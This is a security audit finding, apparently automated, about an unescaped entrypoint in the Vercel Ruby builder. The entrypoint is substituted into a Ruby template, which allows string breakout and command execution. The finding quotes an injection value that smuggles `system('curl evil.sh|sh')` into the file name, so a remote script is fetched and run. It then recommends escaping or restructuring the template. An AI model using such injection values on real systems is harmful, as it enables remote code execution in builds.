# [MEDIUM] Ruby template injection via unescaped entrypoint in build-time handler shim

**File:** [`packages/ruby/src/index.ts`](https://github.com/vercel/vercel/blob/melkey/bun-working-branch/blob/melkey/packages/ruby/src/index.ts#L256-L259) (lines 256, 257, 258, 259)
**Project:** vercel
**Severity:** MEDIUM  •  **Confidence:** high  •  **Slug:** `rce`

## Owners

**Suggested assignee:** `tom.knickman@vercel.com` _(via last-committer)_

## Finding

The build function performs `originalHandlerRbContents.replace(/__VC_HANDLER_FILENAME/g, userHandlerFilePath)` where `userHandlerFilePath` is `entrypoint.replace(/\.rb$/, '')`. The placeholder appears inside a single-quoted Ruby string in `vc_init.rb`: `$entrypoint = '__VC_HANDLER_FILENAME'`. A crafted entrypoint such as `foo'; system('curl evil.sh|sh'); a='.rb` (after `.rb` strip becomes `foo'; system('curl evil.sh|sh'); a='`) escapes the single-quoted string, producing valid Ruby that runs an arbitrary system command before the request handler is registered. The replacement is performed without any escaping. Although the build runs in the project owner's own container (so a project owner attacking themselves does not gain privilege), the bug means any string treated as `entrypoint` becomes Ruby code, which is unexpected for downstream users of `@vercel/ruby` and weakens the mental contract that entrypoint is a path string only.

## Recommendation

Escape Ruby single-quote special characters (`\\`, `'`) before substitution, or restructure the template so the entrypoint is read at runtime from a sibling file (e.g., write the path to `.entrypoint` and have the Ruby shim do `$entrypoint = File.read(File.expand_path('.entrypoint', __dir__)).chomp`). Also consider validating the entrypoint against a strict allow-list pattern before any string substitution.

## Recent committers (`git log`)

- Thomas Knickman <tom.knickman@vercel.com> (2026-03-04)
- Ricardo Gonzalez <30984749+ricardo-agz@users.noreply.github.com> (2026-02-23)
- Greg Schofield <greg.c.schofield@gmail.com> (2025-12-18)
